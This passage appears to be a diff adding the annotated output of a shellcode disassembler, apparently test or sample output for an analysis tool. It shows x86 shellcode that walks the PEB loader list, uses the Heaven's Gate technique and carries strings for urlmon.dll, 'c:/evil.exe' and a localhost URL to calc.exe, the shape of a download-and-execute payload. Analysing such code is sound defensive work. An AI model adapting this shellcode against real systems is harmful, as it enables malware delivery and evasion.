+[32;1m0x1c3[0m [37mcmp dword ptr [edx + 0x18], ecx          [31;1m39 4a 18 [0m             [36;1m 9J.[0m
+[32;1m0x1c6[0m [37mjne 0x192                                [31;1m75 ca [0m                [36;1m u.[0m
+
+[32;1m0x1c8[0m [37mpop esi                                  [31;1m5e [0m                   [36;1m ^[0m
+[32;1m0x1c9[0m [37mpop edi                                  [31;1m5f [0m                   [36;1m _[0m
+[32;1m0x1ca[0m [37mcall 0x1cf                               [31;1me8 00 00 00 00 [0m       [36;1m .....[0m
+[33;1m	 label_0x1cf:
+[0m[32;1m0x1cf[0m [37mpop eax                                  [31;1m58 [0m                   [36;1m X[0m
+[35;1m    [35;1m ; GetPC[0m                                                                      
+[32;1m0x1d0[0m [37mlcall 0x33:0x12310000                    [31;1m9a 00 00 31 12 33 00 [0m [36;1m ...1.3.[0m
+[35;1m    [35;1m ; invoking Heaven's Gate technique[0m                                            
+[32;1m0x1d7[0m [37mret                                      [31;1mc3 [0m                   [36;1m .[0m
+
+[33;1m	 label_0x1d8:
+[0m[32;1m0x1d8[0m [37mpop esi                                  [31;1m5e [0m                   [36;1m ^[0m
+[32;1m0x1d9[0m [37mpop edi                                  [31;1m5f [0m                   [36;1m _[0m
+[32;1m0x1da[0m [37mlodsd eax, dword ptr [esi]               [31;1mad [0m                   [36;1m .[0m
+[32;1m0x1db[0m [37mpush esi                                 [31;1m56 [0m                   [36;1m V[0m
+[32;1m0x1dc[0m [37mmov ebp, dword ptr fs:[eax + 0x30]       [31;1m64 8b 68 30 [0m          [36;1m d.h0[0m
+[35;1m    [35;1m; load TIB[0m                                                                    
+[32;1m0x1e0[0m [37mmov edi, dword ptr [edi + 0xc]           [31;1m8b 7f 0c [0m             [36;1m ...[0m
+[35;1m    [35;1m; load PEB_LDR_DATA LoaderData[0m                                                
+[32;1m0x1e3[0m [37mmov edi, dword ptr [edi + 0x14]          [31;1m8b 7f 14 [0m             [36;1m ...[0m
+[35;1m    [35;1m; LIST_ENTRY InMemoryOrderModuleList[0m                                            
+[32;1m0x1e6[0m [37mlodsd eax, dword ptr [esi]               [31;1mad [0m                   [36;1m .[0m
+[35;1m    [35;1m; advancing DLL flink[0m                                                         
+[32;1m0x1e7[0m [37mpush ebx                                 [31;1m53 [0m                   [36;1m S[0m
+[35;1m    [35;1m; pushing return address [0m                                                     
+[32;1m0x1e8[0m [37mret                                      [31;1mc3 [0m                   [36;1m .[0m
+[35;1m    [35;1m; returning to ebx[0m                                                            
+
+[32;1m0x1e9[0m [37mpush 0x33                                [31;1m6a 33 [0m                [36;1m j3[0m
+[35;1m    [35;1m ; Heaven's gate destination address: 0x33[0m                                            
+[32;1m0x1eb[0m [37mpush 0x11111111                          [31;1m68 11 11 11 11 [0m       [36;1m h....[0m
+[32;1m0x1f0[0m [37mretf                                     [31;1mcb [0m                   [36;1m .[0m
+[35;1m    [35;1m ; invoking Heaven's Gate technique[0m                                            
+[32;1m0x1f1[0m [37mpush edx                                 [31;1m52 [0m                   [36;1m R[0m
+[35;1m    [35;1m; pushing return address [0m                                                     
+[32;1m0x1f2[0m [37mret                                      [31;1mc3 [0m                   [36;1m .[0m
+[35;1m    [35;1m; returning to edx[0m                                                            
+
+[32;1m0x1f3[0m [37mljmp 0x33:0xdeadbeef                     [31;1mea ef be ad de 33 00 [0m [36;1m .....3.[0m
+[35;1m    [35;1m ; invoking Heaven's Gate technique[0m                                            
+[32;1m0x1fa[0m [37mmov ebx, ebp                             [31;1m89 eb [0m                [36;1m ..[0m
+[32;1m0x1fc[0m [37mmov esi, ebx                             [31;1m89 de [0m                [36;1m ..[0m
+[32;1m0x1fe[0m [37madd ebx, dword ptr [edx + 0x24]          [31;1m03 5a 24 [0m             [36;1m .Z$[0m
+[32;1m0x201[0m [37mlea eax, [ebx + ecx*2]                   [31;1m8d 04 4b [0m             [36;1m ..K[0m
+[32;1m0x204[0m [37mmovzx eax, word ptr [eax]                [31;1m0f b7 00 [0m             [36;1m ...[0m
+[32;1m0x207[0m [37mpush 0x26                                [31;1m6a 26 [0m                [36;1m j&[0m
+[32;1m0x209[0m [37mpop eax                                  [31;1m58 [0m                   [36;1m X[0m
+[32;1m0x20a[0m [37madd eax, 0x14                            [31;1m83 c0 14 [0m             [36;1m ...[0m
+[32;1m0x20d[0m [37mxor ebx, ebx                             [31;1m31 db [0m                [36;1m 1.[0m
+[32;1m0x20f[0m [37madd ebx, eax                             [31;1m01 c3 [0m                [36;1m ..[0m
+[32;1m0x211[0m [37mmov edx, ebx                             [31;1m89 da [0m                [36;1m ..[0m
+[32;1m0x213[0m [37msub edx, eax                             [31;1m29 c2 [0m                [36;1m ).[0m
+[32;1m0x215[0m [37mpush edx                                 [31;1m52 [0m                   [36;1m R[0m
+[32;1m0x216[0m [37mlcall 0x33:0x1337c0de                    [31;1m9a de c0 37 13 33 00 [0m [36;1m ...7.3.[0m
+[35;1m    [35;1m ; invoking Heaven's Gate technique[0m                                            
+[32;1m0x21d[0m [37mcall dword ptr fs:[0xc0]                 [31;1m64 ff 15 c0 00 00 00 [0m [36;1m d......[0m
+[35;1m    [35;1m ; Calling Windows syscall - value: 0x3a[0m                                            
+[32;1m0x224[0m [37mlea eax, [esi + eax*4]                   [31;1m8d 04 86 [0m             [36;1m ...[0m
+[32;1m0x227[0m [37madd eax, dword ptr [edx + 0x1c]          [31;1m03 42 1c [0m             [36;1m .B.[0m
+[32;1m0x22a[0m [37mmov eax, dword ptr [eax]                 [31;1m8b 00 [0m                [36;1m ..[0m
+[32;1m0x22c[0m [37madd eax, esi                             [31;1m01 f0 [0m                [36;1m ..[0m
+[32;1m0x22e[0m [37mstosd dword ptr es:[edi], eax            [31;1mab [0m                   [36;1m .[0m
+[32;1m0x22f[0m [37mcall 0x23f                               [31;1me8 0b 00 00 00 [0m       [36;1m .....[0m
+[32;1m0x234[0m [37madd eax, 3                               [31;1m83 c0 03 [0m             [36;1m ...[0m
+[32;1m0x237[0m [37mpush 0x33                                [31;1m6a 33 [0m                [36;1m j3[0m
+[35;1m    [35;1m ; Heaven's gate destination address: 0x33[0m                                            
+[32;1m0x239[0m [37mpush 0x401000                            [31;1m68 00 10 40 00 [0m       [36;1m h..@.[0m
+[32;1m0x23e[0m [37mretf                                     [31;1mcb [0m                   [36;1m .[0m
+[35;1m    [35;1m ; invoking Heaven's Gate technique[0m                                            
+[33;1m	 label_0x23f:
+[0m[32;1m0x23f[0m [37mpop ebx                                  [31;1m5b [0m                   [36;1m [[0m
+[35;1m    [35;1m ; GetPC[0m                                                                      
+[32;1m0x240[0m [37mpop ebx                                  [31;1m5b [0m                   [36;1m [[0m
+[32;1m0x241[0m [37mpush ebx                                 [31;1m53 [0m                   [36;1m S[0m
+[35;1m    [35;1m; pushing return address [0m                                                     
+[32;1m0x242[0m [37mret                                      [31;1mc3 [0m                   [36;1m .[0m
+[35;1m    [35;1m; returning to ebx[0m                                                            
+
+[32;1m0x243[0m [37mpop esi                                  [31;1m5e [0m                   [36;1m ^[0m
+[32;1m0x244[0m [37madd ebx, 4                               [31;1m83 c3 04 [0m             [36;1m ...[0m
+[32;1m0x247[0m [37minc ecx                                  [31;1m41 [0m                   [36;1m A[0m
+[32;1m0x248[0m [37mcmp dword ptr [esi], 0xffff              [31;1m81 3e ff ff 00 00 [0m    [36;1m .>....[0m
+[32;1m0x24e[0m [37mjne 0x18e                                [31;1m0f 85 3a ff ff ff [0m    [36;1m ..:...[0m
+
+[32;1m0x254[0m [37mret                                      [31;1mc3 [0m                   [36;1m .[0m
+
+[32;1m0x255[0m [37murlmon.dll[35;1m ; string[0m		         [31;1m75 72 6c 6d 6f 6e 2e 64 ...[0m[36;1m urlmon.dll[0m
+[32;1m0x25f[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x260[0m [37mc:/evil.exe[35;1m ; string[0m		        [31;1m63 3a 2f 65 76 69 6c 2e ...[0m[36;1m c:/evil.exe[0m
+[32;1m0x26b[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x26c[0m [37mhttp://127.0.0.1:8080/calc.exe[35;1m ; string[0m		  [31;1m68 74 74 70 3a 2f 2f 31 ...[0m[36;1m http://127.0.0.1:8080/calc.exe[0m
+[32;1m0x28a[0m [37madd bh, al                               [31;1m00 c7 [0m                [36;1m ..[0m
+[32;1m0x28c[0m [37mmov dh, byte ptr [ecx]                   [31;1m8a 31 [0m                [36;1m .1[0m
+[32;1m0x28e[0m [37minc esi                                  [31;1m46 [0m                   [36;1m F[0m
+[32;1m0x28f[0m [37msub byte ptr es:[eax + ecx*8 + 0xffff], 1 [31;1m26 80 ac c8 ff ff 00 00 ...[0m[36;1m &........[0m
+[32;1m0x298[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x29a[0m [37madd byte ptr [edx], al                   [31;1m00 02 [0m                [36;1m ..[0m
+[32;1m0x29c[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x29e[0m [37madd byte ptr [ecx - 0x26a2dd], bl        [31;1m00 99 23 5d d9 ff [0m    [36;1m ..#]..[0m
+[32;1m0x2a4[0m [37minc dword ptr [eax]                      [31;1mff 00 [0m                [36;1m ..[0m
+[32;1m0x2a6[0m [37madd byte ptr [ebx], al                   [31;1m00 03 [0m                [36;1m ..[0m
+[32;1m0x2a8[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x2aa[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x2ac[0m [37malign 0x50                               [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x2fc[0m [37madd dword ptr [eax], eax                 [31;1m01 00 [0m                [36;1m ..[0m
+[32;1m0x2fe[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x300[0m [37mand eax, dword ptr [eax]                 [31;1m23 00 [0m                [36;1m #.[0m
+[32;1m0x302[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x304[0m [37madd al, byte ptr [eax]                   [31;1m02 00 [0m                [36;1m ..[0m
+[32;1m0x306[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x308[0m [37mpush es                                  [31;1m06 [0m                   [36;1m .[0m
+[32;1m0x309[0m [37madd byte ptr [ecx], ch                   [31;1m00 29 [0m                [36;1m .)[0m
+[32;1m0x30b[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x30d[0m [37madd byte ptr [edx], al                   [31;1m00 02 [0m                [36;1m ..[0m
+[32;1m0x30f[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x311[0m [37madd byte ptr [esi], al                   [31;1m00 06 [0m                [36;1m ..[0m
+[32;1m0x313[0m [37madd byte ptr [eax], bh                   [31;1m00 38 [0m                [36;1m .8[0m
+[32;1m0x315[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x317[0m [37madd byte ptr [edx], al                   [31;1m00 02 [0m                [36;1m ..[0m
+[32;1m0x319[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x31b[0m [37madd byte ptr [esi], al                   [31;1m00 06 [0m                [36;1m ..[0m
+[32;1m0x31d[0m [37madd byte ptr [edi], bh                   [31;1m00 3f [0m                [36;1m .?[0m
+[32;1m0x31f[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x321[0m [37madd byte ptr [edx], al                   [31;1m00 02 [0m                [36;1m ..[0m
+[32;1m0x323[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x325[0m [37madd byte ptr [esi], al                   [31;1m00 06 [0m                [36;1m ..[0m
+[32;1m0x327[0m [37madd byte ptr [eax], bl                   [31;1m00 58 00 [0m             [36;1m .X.[0m
+[32;1m0x32a[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x32c[0m [37madd al, byte ptr [eax]                   [31;1m02 00 [0m                [36;1m ..[0m
+[32;1m0x32e[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x330[0m [37mpush es                                  [31;1m06 [0m                   [36;1m .[0m
+[32;1m0x331[0m [37madd byte ptr [esi], bl                   [31;1m00 5e 00 [0m             [36;1m .^.[0m
+[32;1m0x334[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x336[0m [37madd al, byte ptr [eax]                   [31;1m02 00 [0m                [36;1m ..[0m
+[32;1m0x338[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x33a[0m [37mpush es                                  [31;1m06 [0m                   [36;1m .[0m
+[32;1m0x33b[0m [37madd byte ptr [eax], bh                   [31;1m00 78 00 [0m             [36;1m .x.[0m
+[32;1m0x33e[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x340[0m [37madd al, byte ptr [eax]                   [31;1m02 00 [0m                [36;1m ..[0m
+[32;1m0x342[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x344[0m [37mpush es                                  [31;1m06 [0m                   [36;1m .[0m
+[32;1m0x345[0m [37madd byte ptr [edi], bh                   [31;1m00 7f 00 [0m             [36;1m ...[0m
+[32;1m0x348[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x34a[0m [37madd al, byte ptr [eax]                   [31;1m02 00 [0m                [36;1m ..[0m
+[32;1m0x34c[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x34e[0m [37mpush es                                  [31;1m06 [0m                   [36;1m .[0m
+[32;1m0x34f[0m [37madd byte ptr [eax + 0x2000000], cl       [31;1m00 88 00 00 00 02 [0m    [36;1m ......[0m
+[32;1m0x355[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x357[0m [37madd byte ptr [esi], al                   [31;1m00 06 [0m                [36;1m ..[0m
+[32;1m0x359[0m [37madd byte ptr [eax + 0x2000000], ah       [31;1m00 a0 00 00 00 02 [0m    [36;1m ......[0m
+[32;1m0x35f[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x361[0m [37madd byte ptr [esi], al                   [31;1m00 06 [0m                [36;1m ..[0m
+[32;1m0x363[0m [37madd byte ptr [edi + 0x2000000], ah       [31;1m00 a7 00 00 00 02 [0m    [36;1m ......[0m
+[32;1m0x369[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x36b[0m [37madd byte ptr [esi], al                   [31;1m00 06 [0m                [36;1m ..[0m
+[32;1m0x36d[0m [37madd byte ptr [edx + 0x2000000], bh       [31;1m00 ba 00 00 00 02 [0m    [36;1m ......[0m
+[32;1m0x373[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x375[0m [37madd byte ptr [esi], al                   [31;1m00 06 [0m                [36;1m ..[0m
+[32;1m0x377[0m [37madd bl, al                               [31;1m00 c3 [0m                [36;1m ..[0m
+[32;1m0x379[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x37b[0m [37madd byte ptr [edx], al                   [31;1m00 02 [0m                [36;1m ..[0m
+[32;1m0x37d[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x37f[0m [37madd byte ptr [esi], al                   [31;1m00 06 [0m                [36;1m ..[0m
+[32;1m0x381[0m [37madd byte ptr [esi], ch                   [31;1m00 2e [0m                [36;1m ..[0m
+[32;1m0x383[0m [37mimul bp, word ptr [ebp], 0               [31;1m66 69 6c 65 00 00 00 [0m [36;1m file...[0m
+[32;1m0x38a[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x38b[0m [37malign 0x3                                [31;1m00 00 00 fe ...[0m       [36;1m .......[0m
+[32;1m0x38e[0m [37mdb 0xfe                                  [31;1mfe [0m                   [36;1m .[0m
+[32;1m0x38f[0m [37minc dword ptr [eax]                      [31;1mff 00 [0m                [36;1m ..[0m
+[32;1m0x391[0m [37madd byte ptr [edi + 1], ah               [31;1m00 67 01 [0m             [36;1m .g.[0m
+[32;1m0x394[0m [37mwork.asm[35;1m ; string[0m		           [31;1m77 6f 72 6b 2e 61 73 6d [0m[36;1m work.asm[0m
+[32;1m0x39c[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x39d[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x39e[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x39f[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x3a0[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x3a0[0m [37malign 0x6                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x3a6[0m [37mdb 0x2e                                  [31;1m2e [0m                   [36;1m .[0m
+[32;1m0x3a7[0m [37mdb 0x74                                  [31;1m74 [0m                   [36;1m t[0m
+[32;1m0x3a8[0m [37mdb 0x65                                  [31;1m65 [0m                   [36;1m e[0m
+[32;1m0x3a9[0m [37mdb 0x78                                  [31;1m78 [0m                   [36;1m x[0m
+[32;1m0x3aa[0m [37mdb 0x74                                  [31;1m74 [0m                   [36;1m t[0m
+[32;1m0x3ab[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x3ac[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x3ad[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x3ae[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x3af[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x3af[0m [37malign 0x3                                [31;1m00 00 00 01 ...[0m       [36;1m .......[0m
+[32;1m0x3b2[0m [37madd dword ptr [eax], eax                 [31;1m01 00 [0m                [36;1m ..[0m
+[32;1m0x3b4[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x3b6[0m [37madd eax, dword ptr [ecx]                 [31;1m03 01 [0m                [36;1m ..[0m
+[32;1m0x3b8[0m [37mles eax, ptr [edx]                       [31;1mc4 02 [0m                [36;1m ..[0m
+[32;1m0x3ba[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x3bc[0m [37mor eax, 0                                [31;1m0d 00 00 00 00 [0m       [36;1m .....[0m
+[32;1m0x3c1[0m [37malign 0x9                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x3ca[0m [37mdb 0x2e                                  [31;1m2e 61 62 73 6f 6c 75 74 [0m[36;1m .absolut[0m
+[32;1m0x3d2[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x3d4[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x3d6[0m [37mdb 0xff                                  [31;1mff [0m                   [36;1m .[0m
+[32;1m0x3d7[0m [37minc dword ptr [eax]                      [31;1mff 00 [0m                [36;1m ..[0m
+[32;1m0x3d9[0m [37madd byte ptr [ebx], al                   [31;1m00 03 [0m                [36;1m ..[0m
+[32;1m0x3db[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x3dd[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x3df[0m [37malign 0x1                                [31;1m00 04 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x3e0[0m [37mdb 0x04                                  [31;1m04 [0m                   [36;1m .[0m
+[32;1m0x3e1[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x3e2[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x3e3[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x3e4[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x3e5[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x3e5[0m [37malign 0x7                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x3ec[0m [37mdb 0x02                                  [31;1m02 [0m                   [36;1m .[0m
+[32;1m0x3ed[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x3ee[0m [37mgeteip[35;1m ; string[0m		             [31;1m67 65 74 65 69 70 [0m    [36;1m geteip[0m
+[32;1m0x3f4[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x3f5[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x3f6[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x3f7[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x3f8[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x3f8[0m [37malign 0x6                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x3fe[0m [37mdb 0x02                                  [31;1m02 [0m                   [36;1m .[0m
+[32;1m0x3ff[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x400[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x401[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x402[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x403[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x403[0m [37malign 0x1                                [31;1m00 13 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x404[0m [37mdb 0x13                                  [31;1m13 [0m                   [36;1m .[0m
+[32;1m0x405[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x406[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x407[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x408[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x409[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x409[0m [37malign 0x7                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x410[0m [37mdb 0x02                                  [31;1m02 [0m                   [36;1m .[0m
+[32;1m0x411[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x412[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x413[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x414[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x415[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x415[0m [37malign 0x1                                [31;1m00 26 00 00 ...[0m       [36;1m .&.....[0m
+[32;1m0x416[0m [37mdb 0x26                                  [31;1m26 [0m                   [36;1m &[0m
+[32;1m0x417[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x418[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x419[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x41a[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x41b[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x41b[0m [37malign 0x7                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x422[0m [37mdb 0x02                                  [31;1m02 [0m                   [36;1m .[0m
+[32;1m0x423[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x424[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x425[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x426[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x427[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x427[0m [37malign 0x1                                [31;1m00 37 00 00 ...[0m       [36;1m .7.....[0m
+[32;1m0x428[0m [37mdb 0x37                                  [31;1m37 [0m                   [36;1m 7[0m
+[32;1m0x429[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x42a[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x42b[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x42c[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x42d[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x42d[0m [37malign 0x7                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x434[0m [37mdb 0x02                                  [31;1m02 [0m                   [36;1m .[0m
+[32;1m0x435[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x436[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x437[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x438[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x439[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x439[0m [37malign 0x1                                [31;1m00 48 00 00 ...[0m       [36;1m .H.....[0m
+[32;1m0x43a[0m [37mdb 0x48                                  [31;1m48 [0m                   [36;1m H[0m
+[32;1m0x43b[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x43c[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x43d[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x43e[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x43f[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x43f[0m [37malign 0x7                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x446[0m [37mdb 0x02                                  [31;1m02 [0m                   [36;1m .[0m
+[32;1m0x447[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x448[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x449[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x44a[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x44b[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x44b[0m [37malign 0x1                                [31;1m00 57 00 00 ...[0m       [36;1m .W.....[0m
+[32;1m0x44c[0m [37mdb 0x57                                  [31;1m57 [0m                   [36;1m W[0m
+[32;1m0x44d[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x44e[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x44f[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x450[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x451[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x451[0m [37malign 0x7                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x458[0m [37mdb 0x02                                  [31;1m02 [0m                   [36;1m .[0m
+[32;1m0x459[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x45a[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x45b[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x45c[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x45d[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x45d[0m [37malign 0x1                                [31;1m00 6c 00 00 ...[0m       [36;1m .l.....[0m
+[32;1m0x45e[0m [37mdb 0x6c                                  [31;1m6c [0m                   [36;1m l[0m
+[32;1m0x45f[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x460[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x461[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x462[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x463[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x463[0m [37malign 0x7                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x46a[0m [37mdb 0x02                                  [31;1m02 [0m                   [36;1m .[0m
